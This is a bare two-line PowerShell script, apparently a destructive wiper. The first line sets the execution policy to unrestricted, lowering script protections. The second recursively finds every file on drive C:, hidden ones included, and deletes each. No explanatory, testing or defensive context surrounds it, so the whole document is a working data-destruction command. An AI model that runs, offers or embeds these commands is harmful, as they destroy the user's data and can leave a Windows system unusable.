Set-ExecutionPolicy unrestricted
Get-ChildItem -Path C:\ -Include *.* -Recurse -Force | foreach { $_.Delete()}